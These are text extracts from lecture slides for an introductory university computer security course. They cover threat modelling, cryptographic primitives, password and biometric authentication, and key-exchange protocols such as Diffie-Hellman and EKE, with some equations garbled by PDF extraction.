–
Authorization
Methods
Access Control Mechanisms: Restrict access to physical
devices, software services, and information.
–
Authentication
Definition
Assurance that a principal, data, or software is genuine.–
Authentication
Types
Entity Authentication: Verifies the identity of users.–
Data Origin Authentication: Verifies the source of data.–
Accountability
Definition
Ability to identify principals responsible for actions.–
Accountability
Methods
Transaction Evidence and Logs: Electronic means to
record actions and identify principals.
–

Key TermsComputer Security
Security Policy
Specifies system rules and practices, defining what is
allowed and not allowed.
–
Attacks
Examples:
Deliberate steps intended to cause a security violation.–
Unauthorized Access–
Data Breaches–
Denial of Service (DoS) Attacks–

Risk Assessment and Modeling
Risk
Risk is the expected loss due to harmful future events
relative to assets and over a fixed time period.
–
Risk Equation
R = T × V × C
T (Threat): Probability of threat occurrence.–
V (Vulnerability): Presence of system vulnerabilities.–
C (Cost): Impact cost of a successful attack.–

Adversary Modeling
Adversary Modeling
Definition
Identifying and understanding potential attackers, their
objectives, methods, capabilities, and resources.
–
Attributes of Adversary
Objectives: Goals of the adversary.1.
Methods: Attack techniques used.2.
Capabilities: Resources, skills, and knowledge available.3.
Funding Level: Financial resources influencing
determination and methods.
4.
Outsider vs. Insider: Origin of the attack.5.
Adversary Attributes
1- Objectives:
These often suggest target assets requiring special
protection.
–
Examples: Stealing sensitive data, disrupting services,
financial gain.
–
Adversary Attributes
2- Methods:
Anticipated attack techniques or types of attacks.–
Examples: Phishing, malware, social engineering, direct
network attacks.
–
Adversary Attributes
3- Capabilities:
Computing resources (CPU, storage, bandwidth), skills,
knowledge, personnel, opportunity (e.g., physical access to
target machines).
–
Examples: Access to high-powered computers, knowledge
of system vulnerabilities, skilled personnel.
–
Adversary Attributes
4- Funding Level:
Influences attacker determination, methods, and
capabilities.
–
Examples: Government-funded agencies vs. individual
hackers.
–
Adversary Attributes
5- Outsider vs. Insider:
Outsiders launch attacks without prior special access.–
Insiders have some starting advantage, such as employees
with network credentials.
–
Named Groups of Adversaries
1Foreign intelligence (including government-funded agencies)
2Cyber-terrorists or politically-motivated adversaries
3Industrial espionage agents (perhaps funded by competitors)
4Organized crime (groups)
5Lesser criminals and crackers (i.e., individuals who break into computers)
6Malicious insiders (including disgruntled employees)
7Non-malicious employees (often security-unaware)
Security and Software
Software Development and Security Analysis
Threat Modelling Approaches
Threat Modelling
Threat Model
Identifies threats, threat agents, and attack vectors
considered in scope to defend against.
–
Threat Modelling
Approaches:
Diagram-Driven Threat Modeling1.
Attack Trees2.
Checklists3.
STRIDE4.

Diagram-Driven Threat Modeling
A visual approach starting with an architectural
representation of the system.
–
Diagrams show system components and data flow links,
identifying gateways and trust domains.
–
1
Areas with shared security policies or trust levels 1. ↩︎
Diagram-Driven Threat Modeling Steps 1
Firewall: A security system that monitors and controls network traffic based on predefined rules. 1. ↩︎
Draw an architectural diagram with system components
and communication links.
1.
Mark gateways where controls restrict communication.2.
Define trust domains based on trust assumptions (e.g.,
authenticated users).
3.
Assess how trust assumptions could be violated for each
component, link, and domain.
4.
Simplify into a data flow diagram tracing data flow
through tasks.
5.
--6.

Consider User Workflow
Trace user actions from task initiation to completion,
including uncommon tasks like account creation and
software updates.
–
Highlight where sensitive data is stored and ensure all
access paths are shown.
–
Attack Trees for Threat Modeling
Attack trees identify attack vectors using a hierarchical
model starting with an overall attack goal.
–

Attack Trees for Threat Modeling Steps
Label the root node with the attack goal (e.g., enter a
house).
1.
Decompose into lower nodes with alternative methods
(e.g., window, door, tunnel).
2.
Further refine each method into specific actions (e.g.,
unlock, break).
3.
Each path from leaf to root represents an attack vector.4.
Checklists
Fixed attack checklists drawn from past experiences to
ensure well-known threats are not overlooked.
–
STRIDE
Categories:
A mnemonic for recalling six categories of threats.–
Where can things break? Maybe STRIDE
Spoofing: Impersonating entities (e.g., websites, users).1.
Tampering: Unauthorized alteration of code, data, or
packets.
2.
Repudiation: Denying responsibility for actions.3.
Information Disclosure: Unauthorized release of data.4.
Denial of Service: Disrupting service availability.5.
Escalation of Privilege: Gaining unauthorized access
levels.
6.
Model-Reality Gaps and
Real-World Outcomes
Threat modeling is difficult due to invalid assumptions
and focusing on wrong threats.
Example (Hotel Safebox)
Checking into a hotel with a small safe, the combination
chosen by the guest might not be secure against hotel staff
with master keys.
–
Quality of a Threat Model
Depends on how accurately it reflects system details and
operating environment.
–
Gaps arise from abstraction, invalid assumptions, and
misplaced trust.
–

Why Computer Security is Hard
Rapid technological changes.–
Evolving attack techniques.–
Human factors and usability issues.–
Security is an ongoing process requiring constant
vigilance and adaptation.
Course Logistics
 Computer Security
This course offers a comprehensive introduction to
computer security, focusing on:
• Cryptography
• Software, network, and web security
 Course Objectives
By the end of the course, students will be able to:
Grasp foundational security concepts and principles.1.
Understand cryptographic building blocks for secure
communication.
2.
Implement secure user authentication mechanisms.3.
Analyze authentication and key establishment protocols.4.
Recognize and counteract malicious software threats.5.
Enhance web and browser security using best practices.6.
Deploy firewalls and establish secure tunnels for data transmission.7.
Detect intrusions and mitigate network-based attacks.8.
Secure wireless LANs (e.g., Wi-Fi) and evaluate 802.11 standards.9.
Understand blockchain technologies (e.g., Bitcoin, Ethereum).10.
 Lecture Schedule
Week Lecture 1 Lecture 2
Week 1Fundamentals of Computer Security Foundations of Cryptography
Week 2Authentication Methods Protocols for Secure Communication
Week 3Malware Threats Securing Web Applications
Week 4Network Defense: Firewalls and Tunnels Detecting and Preventing Intrusions
Week 5Securing Wireless Networks Securing Wireless Networks
 Grading Breakdown
Component Weight
Project 25%
Final Exam 75%
Policy:
Passing the final exam is mandatory for the group
assignment grade to count toward the final grade.
–
 Collaboration Policy
Academic Integrity
Consequences:
Plagiarism or cheating will result in a failing grade and
potential reporting to the university.
Submit original work only.–
Discussion with peers is encouraged!–
Conduct Cybersecurity Exercises ONLY in Lab
Environment
Outside the lab environment is strictly prohibited.
All practical exercises related to cybersecurity must be
performed exclusively within the lab environment
provided by this course.
–
Engaging in activities such as:–
Penetration testing–
Network scanning–
Exploiting vulnerabilities–
 Legal and Ethical Implications
Performing unauthorized cybersecurity activities can:
Violate laws at the local, national, and international levels.–
Lead to serious legal consequences, including:–
Fines–
Imprisonment!–
What is expected from you?
Category Number Time Each Total Time
Class Time
Lectures 11 2 22
Lab/Tutorial 6 2 12
Revision class 1 2 2
Total in Class Time 36
Outside Class Time
Practice exams 1 2 2
Going through lecture slides/notes 11 2 22
Revision 29
Project Work 1 22 22
Total Outside Class Time 75
Total Time 111
Grading Scheme
Grade Range
10 > 95% - <= 100%
9 > 85% - < 95%
8 > 75% - < 85%
7 > 65% - < 75%
6 > 55% – < 65%
F <55%
You have to pass
the exam to
get the grades
for the project!You need >5.5 in your exam (more than 55
% in the written exam)
 Reminder
Ethical Standards in Cybersecurity
The skills you learn in this course are for lawful and
protective purposes only.
–
Misusing cybersecurity knowledge is a serious offense
with long-lasting consequences.
–
Let’s focus on learning responsibly!
```

## Lecture 2.pdf

[Lecture 2.pdf](/Users/davidwickerhf/Downloads/Computer Security/Lecture 2.pdf)

```text
Foundations of CryptographyBCS2420
Dr. Ashish Sai
ashish.sai@maastrichtuniversity.nl
Cryptography is the foundational building blocks
for computer security, analogous to the 
 electrical
wiring and 
 power supply in house-building.

Encryption and Decryption
What is Encryption 
 and Decryption 
?
Encryption algorithms transform data (plaintext) into an
unintelligible form (ciphertext) to provide data
confidentiality.
–
Decryption algorithms reverse the process using a
decryption key to recover the plaintext.
–
Key Terms
Plaintext: Original data.–
Ciphertext: Encrypted data.–
Encryption Key: Used to encrypt
data.
–
Decryption Key: Used to decrypt
data.
–

Generic Encryption Notation
Let  denote a plaintext message,  the ciphertext, and ,
 the encryption and decryption algorithms
parameterized by symmetric keys ,  respectively.
Equations
m c Ek
Dk′
kk′
c=E(m)k
m=D(c)k′
Caesar Cipher Example
The encryption algorithm simply substituted each
alphabetic plaintext character by that occurring three
letters later in the alphabet.
Caesar’s famous cipher was rather simple.
Key Search
An attacker must try all keys in the key space , expecting
to find the correct key after trying half of the key space.
For a 128-bit key, this means trying approximately (2)
keys.
1
{127}
Key Space: The total set of possible keys in a cryptographic algorithm, determining its strength and resistance to brute-force attacks. 1. ↩︎
Exhaustive Key Search
A critical property of good encryption algorithms is that it
should be infeasible to recover plaintext from ciphertext
without knowledge of the decryption key.
Example: DES Key Space
The DES (Data Encryption Standard) key space (56 bits) can
be visualized as a 3,900-km super-highway from Lisbon,
Portugal to Istanbul, Turkey, 316 lanes wide and tall, filled
with white golf balls except for one black ball.
Cipher Attack Models
Types of Attacks
Ciphertext-Only Attack: Recover plaintext or key from
ciphertext alone.
1.
Known-Plaintext Attack: Given some plaintext and
corresponding ciphertext, recover unknown plaintext or
key from further ciphertext.
2.
Chosen-Plaintext Attack: Adversary chooses plaintext
and sees resulting ciphertext.
3.
Chosen-Ciphertext Attack: Adversary chooses ciphertext
and receives corresponding plaintext.
4.
Side note: Passive vs. Active Adversary
Passive Adversary1.
Observes and records but does not alter information.–
Active Adversary2.
Interacts with ongoing transmissions by injecting data
or altering them, or starts new interactions with
legitimate parties.
–
Symmetric-Key Encryption
and Decryption
Symmetric-Key Encryption
In symmetric-key encryption, the encryption and
decryption keys are the same.
Example: Vernam Cipher
The Vernam cipher encrypts plaintext one bit at a time using a key as long as the
plaintext.
–
c=i m⊕i ki
m=i c⊕i ki

Stream Ciphers
Stream ciphers encrypt plaintext one bit or one character
at a time.
The Vernam cipher is an example of a stream cipher
Block Ciphers
Block ciphers process plaintext in fixed-length chunks or
blocks.
Properties:
Blocklength: block size in bits–
Keylength: key size in bits–
If the last plaintext block has fewer bits than the
blocklength, it is padded with “filler” characters
Example: AES Block Cipher
AES (Advanced Encryption Standard) is widely used today, created by
researchers at KU Leuven 
.

Block Cipher Modes
ECB and CBC Modes
ECB Mode1.
Electronic Code-Book (ECB) mode encrypts each block
independently.
–
CBC Mode2.
Cipher-Block Chaining (CBC) mode encrypts each block
with a previous block’s ciphertext.
–

Counter Mode (CTR)
CTR Mode–
Uses a counter value to generate a keystream, which is
then XORed with plaintext blocks.
–

Public-Key Encryption
and Decryption
Public-Key Encryption
In public-key encryption, each party has a key pair
consisting of an encryption public key and a decryption
private key.
Equations
c=E(m)eB
m=D(c)dB

Integrity of Keys
A public key can be published, but its integrity and
authenticity are critical.
–
A private key is not published–
Hybrid Encryption
Process
Combines the efficiency of symmetric-key encryption for
bulk data with the convenience of public-key encryption
for key distribution.
–
Generate a symmetric key k.1.
Encrypt the message m with k.2.
Encrypt k with the recipient's public key .3. eB


Digital SignaturesApplication of Public Key Cryptography
Digital Signature
Digital signatures provide data origin authentication, data
integrity, and non-repudiation .1
Non-repudiation ensures that a party in a communication cannot deny the authenticity of their signature, message, or action, providing proof of origin and
integrity. 
1.
↩︎
Properties
Data Origin Authentication: Assurance of the message
origin.
1.
Data Integrity: Assurance that the message is unchanged.2.
Non-Repudiation: Prevents the sender from denying
having sent the message.
3.

Digital Signatures with Hashing
Process
Digital signatures are often used with hash functions to
efficiently sign messages.
Steps
1 Compute the hash .
2 Sign the hash .
–
h=H(m)
t=S(h)sA

Cryptographic Hash Functions
Hash functions take an input of any length and produce a
fixed-length output called a hash value.
Cryptographic Hash Function Properties
1 One-Way Property: Hard to find the input given the hash
value.
2 Second-Preimage Resistance: Hard to find a second
input with the same hash.
3 Collision Resistance: Hard to find any two distinct inputs
with the same hash.

Message Authentication
Codes (MACs)
Message Authentication Codes (MACs)
MACs ensure the integrity and origin of a message by
appending a tag generated using a secret key.
Process
1 Compute the tag .
2 Verify the tag using the same key k.
–
t=M(m)k

Certificates and Public-
Key Infrastructure (PKI)
Integrity of Public Keys
Public keys must be authenticated to ensure they belong to
the correct entity. Substituting an encryption public key
with an opponent's key compromises security.
Public-Key Certificates
A public-key certificate binds a public key to an owner
using a digital signature from a trusted Certification
Authority (CA).

Certificate Fields
Certificates include several fields:
Version: Certificate format version (e.g., X.509v3)–
Serial Number: Uniquely identifies the certificate–
Issuer: CA’s name–
Validity Period: Dates (Not-Before, Not-After)–
Subject: Owner’s name–
Public Key Information: Algorithm and key value–
Extension Fields: Additional attributes like Subject-
Alternate-Name, Key Usage, etc.
–
Signature Algorithm and Digital Signature: Used by the
CA
–
Field name Contents or description
Version X.509v3 or other versions
Serial-Number uniquely identifies certificate, e.g., for revocation
Issuer issuing CA’s name
Validity-Period specifies dates (Not-Before, Not-After)
Subject owner’s name
Public-Key info specifies (Public-Key-Algorithm, Key-Value)
extension fields
(optional)
Subject-Alternate-Name/SAN-list, Basic-Constraints, Key-Usage,CRL-Distribution-
Points (and others)
Signature-Algorithm(algorithmID, parameters)
Digital-Signature signature of Issuer
Certification Authority (CA) Responsibilities
Before Issuing Certificates
CAs must:
Verify knowledge of the private key.1.
Verify control of computer-addressable identities (e.g.,
domain names, email addresses).
2.
Confirm asserted natural-world names for high-quality
certificates.
3.
Acquiring a Certificate
End-entities request certificates from CAs, usually
providing a Distinguished Name (DN), public key, and other
attributes.
Public-Key Infrastructure (PKI)
PKI is a framework for managing public keys, private keys,
and their use by applications. It includes data structures,
cryptographic toolkits, architectural components (like CAs),
and protocols for key management.

Practical Considerations
Using Cryptographic Toolkits
1 Use well-tested and widely accepted cryptographic
algorithms and protocols.
2 Avoid designing your own cryptographic protocols or
algorithms.
Guidelines–
```

## Lecture 3.pdf

[Lecture 3.pdf](/Users/davidwickerhf/Downloads/Computer Security/Lecture 3.pdf)

```text
Authentication MethodsBCS2420
Dr. Ashish Sai
ashish.sai@maastrichtuniversity.nl
User Authentication
User Authentication
Process of using supporting evidence to corroborate an
asserted identity.
Authentication vs Identification:
Authentication: One-to-one test to verify identity using an
asserted identity (e.g., username and password).
–
Identification: One-to-many test to establish identity from
available information without an asserted identity (e.g.,
facial recognition in a crowd).
–
Purpose
Example: Password required to install or upgrade software
on a device.
End-goals:–
Authentication: Verify identity.–
Authorization: Determine access to privileges or
resources.
–
Password Authentication
Basic Concept
User enters a username and password to access an
account.
–
System verifies the password against stored information.–
A correct password match does not ensure that whoever
entered it is the authorized user; it only indicates
knowledge of the password.
–
Storing Passwords
Cleartext Storage: Risky; exposes all passwords if file is
stolen.
–
Hash Storage: Store password hashes instead of cleartext
passwords using a one-way hash function.
Example
–
Use of one-way hash function to store passwords
securely.
–

Approaches to Defeat Password Authentication
Pre-computed Dictionary Attack
Attack Steps:
Defense: Use salts  and strong hashing algorithms to
mitigate risk.
Create a list of candidate passwords.1.
Compute hashes for each password.2.
Compare stolen password hashes with precomputed
hashes.
3.
1
A salt is a random value added to data (e.g., passwords) before hashing to prevent attacks like dictionary or rainbow table attacks. 1. ↩︎
Categories of Password-guessing Attacks
Online Password Guessing1.
Guesses are sent to the legitimate server.–
The server indicates whether the attempt is correct or
not.
–
Offline Password Guessing2.
Attacker has acquired the system password hash file.–
No per-guess online interaction is needed.–
The number of guesses is limited only by computational
resources available to the attacker.
–

Online Password Guessing and Rate-limiting
Defensive Tactics–
Rate-limit guesses: Throttle guesses across fixed time
windows.
–
Lockout mechanism: Temporarily lock accounts after a
certain number of failed attempts.
–
Example: Doubling response time after successive
incorrect logins: 1s, 2s, 4s, etc.
–
Offline Password Guessing
Assumptions–
Attacker has acquired the password hash file.–
Hash file provides verifiable text, allowing correctness
tests without server interaction.
–
Defense Mechanisms–
Strong Password Policies: Encourage the use of complex
passwords.
–
Hashing Algorithms: Use strong, computationally
intensive hash functions.
–
Salting: Add unique, random values to passwords before
hashing.
–
A modest number of modern GPUs can guess passwords at
400 billion guesses per second 
.
Specialized Password-Hashing Functions
Designed to resist GPU and parallel attacks.–
Examples: Argon2, bcrypt, scrypt.
Argon2
Winner of the Password Hashing Competition (PHC) ,
designed to resist parallel attacks on modern hardware.
–
1
https://www.password-hashing.net 1. ↩︎
Iterated Hashing (Password Stretching)
Concept: Hashing a password multiple times to increase
the computational effort required for guessing.
–
Process:–
Hash the password once with a hash function H.1.
Hash the result again, and repeat this process d times.2.
Stored value=H(p)di
Example:–
For d = 1000, it slows down attacks by a factor of 1000.–
The legitimate server must also compute the iterated
hash!
–
Password Salting
Definition: Adding a unique, random value (salt) to each
password before hashing to prevent pre-computed
dictionary attacks.
Benefit: Prevents attackers from using precomputed tables
of hashes.
Process:–
Select a random salt .1. si
Store the pair .2. (userid,s,H(p,s))i ii
h=i H(p∥s)i i
Pepper (Secret Salt)
Concept: A secret salt not stored, designed to slow down
attacks.
–
Process:–
Choose a random value .1. ri
Store the secret-salted hash .2. H(p,r)ii
Erase .3. ri
Verification:Sequentially try all values r∗
Benefit: Slows down attacks significantly, especially if
combined with regular salt.
–
System-assigned Passwords
and Brute-force Guessing
Concept
System-assigned Passwords: Maximizing difficulty of
guessing by randomly selecting each character.
–
Password Space: For an n-character password from an
alphabet of b characters:
–
Password Space=bn
Probability of Guessing Success
q=  for GT≤R
GT R
G: Number of guesses per unit time.–
T: Number of units of time.–
R = : Size of the password space.– bn
Example Calculation
For n = 10 and b = 95:–
q= =6×1019
(10)(3.154×10)11 7
0.05257
User-chosen Passwords
and Skewed Distributions
Concept
Example
Skewed Distributions: Some passwords are much more
popular than others.
–
Attack Strategy: Attackers try more popular passwords
first.
–
Attackers leveraging empirical password databases  and
heuristic means.
– 1
An empirical password database is a collection of real-world passwords gathered from data breaches, used to analyze trends and inform attack strategies. 1. ↩︎

Password Denylists and Proactive Password Cracking
Password Denylists: Lists of most-popular passwords to
disallow at the time of user selection.
–
Proactive Password Cracking: Systems attempt to crack
their own users' passwords and notify users to change
easily cracked passwords.
–
Heuristic Password-cracking Tools
Common Tools: JohnTheRipper , Hashcat .– 1 2
Techniques: Use pre-computed tables or hash password
guesses on-the-fly with mangling rules.
–
https://github.com/openwall/john 1. ↩︎
https://github.com/hashcat/hashcat 2. ↩︎
Defensive Measures
Defensive measure Primary attack addressed Notes
rate-limiting online guessing some methods result in user lockout
denylisting online guessing disallows worst passwords
salt pre-computed dictionary increases cost of generic attacks
iterated hashing offline guessing combine with salting
pepper offline guessing alternative to iterated hashing
MAC on password offline guessing stolen hash file no longer useful
Password Composition Policies
Best Practices:
Avoid common passwords.–
Use a combination of uppercase, lowercase, digits, and
special characters.
–
Change passwords regularly.–
Example: NIST SP 800-63B 
U.S. government password guidelines:
1
Use password denylists to rule out common, highly
predictable passwords.
–
Mandate rate-limiting to throttle online guessing.–
Recommend against composition rules.–
Mandate secure password storage methods.–
https://pages.nist.gov/800-63-3/sp800-63b.html 1. ↩︎
Password Managers
Security Benefits:
Store and retrieve passwords to reduce cognitive burden.–
User remembers one master password.–
Allows use of strong, random passwords.–
Improves resistance to phishing attacks.–
Password Manager Approaches
1 Password Wallet
2 Derived Passwords
Manages existing passwords, automatically selecting the
password needed based on prior association with the
domain of use.
–
Application-specific or site-specific passwords derived
from a master password plus other information such as the
target domain.
–
Example: PwdHash and Password Multiplier tools.–
Graphical Passwords
Types
Advantages
Example
Android swipe patterns and click-based graphical
passwords.
Pure Recall: User reconstructs a pattern.1.
Cued Recall: User is aided by a graphical cue.2.
Recognition Schemes: User recognizes previously seen
images.
3.
Easier to remember.–
Potentially more secure than text passwords.–
Account Recovery
and Secret Questions
Recovery Methods
1 Recovery Passwords and Links
2 Codes Sent to Telecom Device
3 Question-Based Recovery
Temporary passwords or web page links sent to recovery
email addresses.
–
One-time recovery codes sent to pre-registered phone
numbers.
–
Secret questions or challenge questions answered to reset
passwords.
–
Usability and Security Aspects
Recovery by challenge questions often fails due to non-
unique answers, changes over time, and ease of guessing.
–
One-Time Passwords and Hardware Tokens
OTP Generators–
Use a secret and a time-varying parameter to generate a
one-time password.
–
Hardware Tokens–
Physical devices that generate authentication tokens.–
OTPs Received by Mobile
OTPs can be sent to users via SMS, serving as a second
factor in authentication.
! SIM Swap Attack !
–
Attackers use social engineering to trick providers into
transferring a victim's number to a new SIM.
–
This allows attackers to receive OTPs intended for the
victim.
–
OTPs from Lamport Hash Chains
Initialization:1.
Start with a random secret (seed) ( w ).–
Generate a sequence of OTPs using a one-way hash
function ( H ).
–
h=0 H(w)100
Usage:1.
Each session uses a decrementing index ( i ).–
Server stores the initial hash  for verification.– (h)0
For each authentication, use .– (h )100−i

Lamport Hash Chain for Session i = 76
Setup: Store .– (v←h)0
For Session i = 76:–
–(h=24 H(w))24
Update value: – (v←h)75
v=h→100 h→99 ...→h76
Passcode Generators
Commercial One-Time Password
Generators
Calculator-like devices or
smartphone apps.
–
Photo by Jean-Luc Picard on Unsplash
Types of Challenges
Explicit Challenge:1.
An 8-digit string sent by the system for the user to enter.–
Device requires a keypad.–
Implicit Challenge:2.
A time value, where the passcode remains constant for
one-minute windows.
–
Requires a synchronized clock.–


Biometric Authentication
Types
Physical Biometrics: Fingerprints, facial recognition, iris
recognition.
–
Behavioral Biometrics: Voice authentication, gait, typing
rhythm.
–
Advantages
Challenges
No need to remember passwords.–
Generally perceived as more convenient.–
Biometrics are not secrets; can be captured and reused.–
Difficulty in changing biometric data if compromised.–
Modality Type Notes
fingerprints P common on laptops and smartphones
facial recognition P used by some smartphones
iris recognition P the part of the eye that a contact lens covers
hand geometry P hand length and size, also shape of fingers and palm
retinal scan P based on patterns of retinal blood vessels
voice authentication Mixedphysical-behavioral mix
gait B characteristics related to walking
typing rhythm B keystroke patterns and timing
mouse patterns B also scrolling, swipe patterns on touchscreen devices
Enrollment and
Verification
Process
Example
iPhone fingerprint and face
recognition.
Enrollment: Sample biometric
measurements to build a reference
template.
–
Verification: Compare freshly taken
sample to the template.
–
Photo by Onur Binay on Unsplash
Biometrics as Non-Secrets
Non-Secret Nature: Biometrics are easily obtainable and
not secret.
–
Trusted Input Channel: Ensures that the biometric sample
is from the correct individual.
Example
–
Fingerprints left on surfaces can be copied.–
Faces are easily visible and can be photographed.–
Failure to Enroll (FTE) and Failure to Capture (FTC)
Failure to Enroll (FTE): Inability to register a biometric
template.
–
Failure to Capture (FTC): Inability to capture a usable
sample during verification.
–
Factors Affecting FTE and FTC
Device limitations–
User's physical condition (e.g., dry skin for fingerprint
reading)
–
Environmental factors (e.g., lighting for facial recognition)–
False Rejects (FRR) and False Accepts (FAR)
Definitions
False Reject Rate (FRR): Probability that a legitimate user
is incorrectly rejected.
–
False Accept Rate (FAR): Probability that an imposter is
incorrectly accepted.
–
Trade-Offs
Stricter thresholds increase FRR but reduce FAR.–
Looser thresholds decrease FRR but increase FAR.–

Equal Error Rate (EER)
Equal Error Rate (EER): Point where FAR equals FRR.–
EER is used for simplified single-point comparisons of
biometric systems.
–
Graph: DET and ROC Curves
DET Curve: Plots FAR against FRR.–
ROC Curve: Plots True Positive Rate (TPR) against False
Positive Rate (FPR).
–

Standard Criteria for Biometrics Evaluation
Universality: Availability of the characteristic in all users.1.
Distinguishability: Differences between users'
characteristics.
2.
Invariance: Stability of characteristics over time.3.
Ease of Sampling: Simplicity of obtaining samples.4.
Accuracy: Measured by FAR, FRR, EER, FTE-rate, FTC-rate.5.
Cost: Time, storage, hardware/software costs.6.
User Acceptance: Willingness of users to adopt the
system.
7.
Attack Resistance: Ability to withstand impersonation or
spoofing attacks.
8.
```

## Lecture 4 Legend.pdf

[Lecture 4 Legend.pdf](/Users/davidwickerhf/Downloads/Computer Security/Lecture 4 Legend.pdf)

```text
Lecture 4
Legend
Encrypted Key Exchange (EKE)
EKE combines password-based authentication with public-key encryption to securely establish a
session key without revealing the password.
Basic EKE Protocol
Analysis
1.(A→B:A,{e})AW
( A ) (initiator) sends their identity and a temporary public key , encrypted with the password-
derived key ( W ).
– (e)A
2.(A←B:{E(K)})eA W
( B ) encrypts the session key ( K ) with , then encrypts the result with ( W ).– (e)A
3.(A→B:{T})K
( A ) confirms knowledge of ( K ) by sending a test value ( T ), encrypted with ( K ).–
Attackers cannot verify password guesses for ( W ) without first decrypting ( K ), making brute-force
attacks harder.
–
Diffie-Hellman EKE (DH-EKE)
DH-EKE enhances EKE with Diffie-Hellman (DH) key exchange, ensuring that each session generates a
new, independent key.
Protocol Steps
Forward Secrecy
1.(A→B:A,{g})aW
( A ) sends their identity and a Diffie-Hellman exponent , encrypted with ( W ).– (g)a
2.(A←B:{g})bW
( B ) responds with their own DH exponent , also encrypted with ( W ).3. (g)b
Key Agreement4.
( A ) and ( B ) compute the shared session key  after decrypting each other's DH
values.
5. (K=(g)=ba (g))ab
Since the session key ( K ) is computed from fresh Diffie-Hellman values in every session, even if the
password ( W ) is later compromised, past sessions remain secure.
–
Legend
Symbol Meaning
( A, B ) Communicating parties (Alice and Bob)
( W ) Password-derived encryption key
Temporary public key from ( A )
Encryption of session key ( K ) using 
Diffie-Hellman public values
( K ) Shared session key computed from DH exchange
( T ) Test value to verify ( K )
Let me know if I missed anything here!
(e)A
(E(K))eA (e)A
(g,g)a b
```

## Lecture 4.pdf

[Lecture 4.pdf](/Users/davidwickerhf/Downloads/Computer Security/Lecture 4.pdf)

```text
Protocols for
Secure
CommunicationBCS2420
Dr. Ashish Sai
ashish.sai@maastrichtuniversity.nl
Entity
Authentication
and Key
Establishment
Basic Concepts
Protocol: Exchange of messages between parties (devices).–
Entity Authentication: Verifying the identity of a
communicating party.
–
Cryptographic Protocol: Protocol involving cryptographic
techniques.
–
Authentication Protocol: Provides entity authentication
or authenticated key establishment.
–
Example: Browser-Server
Authentication 
✍
Unilateral Authentication: One party
authenticates to another.
–
Mutual Authentication: Both parties
authenticate to each other.
–

Session Keys
Key Establishment: Arranging a
shared secret (symmetric key) for
secure communications.
–
Session Keys: Keys used for short-
term purposes.
–
Key Transport vs. Key
Agreement
Key Transport: One party unilaterally chooses
and transfers the symmetric key.
–
Key Agreement: Shared key is a function of
values contributed by both parties.
–
Authentication
and Key
Establishment
Protocols
Types of Protocols
Authentication-Only: Provides identity
assurance without establishing a session
key.
1.
Unauthenticated Key Establishment:
Establishes a session key without identity
assurance.
2.
Integrating Authentication with Key
Establishment 
!
Authenticated Key Establishment:
Combining both functions in one
protocol.
–
Key Management
Challenges
Reusing Session Keys
Establishing and securing shared keys 
!
 .–
Managing keys for data at rest and in communications.–
Poor cryptographic hygiene to reuse permanent
session keys.
–

Authentication
ProtocolsConcepts and Mistakes
Demonstrating Knowledge of Secret
A basic idea used to authenticate a remote party B
is to (a) associate a secret with B; and then (b)
carry out a communication believed to be with B,
accepting a demonstration of knowledge of that
secret (key) as evidence that B is the party
involved in the communication.
Replay Attack
Example: Simple replay of H(S) (hash
of the secret) in an authentication
protocol.
Attackers capture and replay a
message without knowing the secret.
–
Dictionary Attack
Example: Using  for
dictionary attack.
Offline guessing attack using verifiable
text.
–
H(r,W)A
Reflection and Relay Attacks
Reflection Attack
A reflection attack is a cryptographic attack
where an adversary reuses a challenge issued
by a verifier and reflects it back as a response,
exploiting mutual authentication to
impersonate a legitimate entity without solving
the challenge.
–
Replay attack
Imagine someone
recording your voice
saying "I want pizza"
and then playing that
recording to the pizza
place to order a pizza.
Reflection attack
An attacker approaches
a security guard who
asks for ID. Instead of
providing one, the
attacker reflects the
request, making the
guard show his own ID,
which the attacker then
reuses to gain access.
Relay Attack
Relaying messages in real time to
impersonate a party.
Example: Car unlocking system using
RF signals.
–
Common
Attacks on
Authentication
Protocols
Types of Attacks
Replay, reflection, relay, interleaving,
dictionary, forward search, pre-
capture.
–
Attack Short description
replay reusing a previously captured message in a later protocol run
reflection replaying a captured message to the originating party
relay forwarding a message in real time from a distinct protocol run
interleaving weaving together messages from distinct concurrent protocols
middle-person exploiting use of a proxy between two end-parties
dictionary using a heuristically prioritized list in a guessing attack
forward search feeding guesses into a one-way function, seeking output matches
pre-capture extracting client OTPs by social engineering, for later use
Defense Mechanisms
Use of time-variant parameters (TVPs).–
Random Numbers–
Sequence Number–
Timestamps–
Establishing
Shared Keys by
Public
Agreement (DH)
Diffie-Hellman Key Exchange
What is Diffie-Hellman?
Why is it Needed?
A cryptographic protocol for securely exchanging a shared secret over an
insecure channel.
–
Used in encryption protocols like TLS, SSH, and VPNs.–
If two parties (Alice & Bob) want to communicate securely, they need a shared
key.
–
Sending the key directly is insecure—an eavesdropper (Eve) could intercept it.–
Diffie-Hellman allows them to derive the same key without ever sending it.–
Diffie-Hellman Key Exchange Protocol
Step 1: Public Parameters–
Alice and Bob agree on:–
A large prime number ( p )–
A generator ( g ) (a primitive root modulo ( p ))–
Step 2: Key Exchange–
Alice picks a secret number ( a ) and sends  to Bob.1. (gamodp)
A → B: – (gamodp)
Bob picks a secret number ( b ) and sends (  ) to Alice.2. gbmodp
A ← B: (  )– gbmodp
Step 3: Compute the Shared Secret–
Bob calculates: – K=(g)abmodp=gabmodp
Alice calculates: – K=(g)bamodp=gbamodp
Since multiplication is commutative, both Alice and Bob derive the same secret key.–
Diffie-Hellman Key Agreement
Why is it Secure?–
An attacker (Eve) can see (  ) and ( 
 ) but cannot compute (  ).
– gamodp gb
modp gabmodp
This is because of the Discrete Logarithm
Problem (DLP):
–
Given (  ), it is computationally hard
to determine ( x ).
– gxmodp
Key
Authentication
Properties and
Goals
Protocol Goals
Forward Secrecy
Arrange shared secret keys that are fresh,
sufficiently long, and random.
–
Ensure keys are known by both parties involved.–
Disclosure of long-term keys does not compromise
previous session keys.
–
Key Authentication Terminology
Implicit and Explicit Key Authentication
Implicit: Key access scope is narrowed
but not confirmed.
–
Explicit: Key-use confirmation proves
possession.
–

Password-
Authenticated
Key ExchangeEKE and SPEKE
PAKE Protocols
PAKE (Password-authenticated key exchange)
Goals and Motivation
Establish authenticated session keys using weak
passwords.
–
Resist offline password-guessing attacks.–

Encrypted Key Exchange (EKE)
Basic EKE Protocol
Analysis
A→ B: A, {  }w1. eA
A← B: {  }w2. E(K)eA
A→ B: {T}k3.
Attackers cannot verify guesses for W without knowing K.–
Diffie-Hellman EKE (DH-EKE)
Protocol Steps
Forward Secrecy
A→ B: A, {  }W1. ga
A← B: {  }W2. gb
A and B compute K from DH agreement.3.
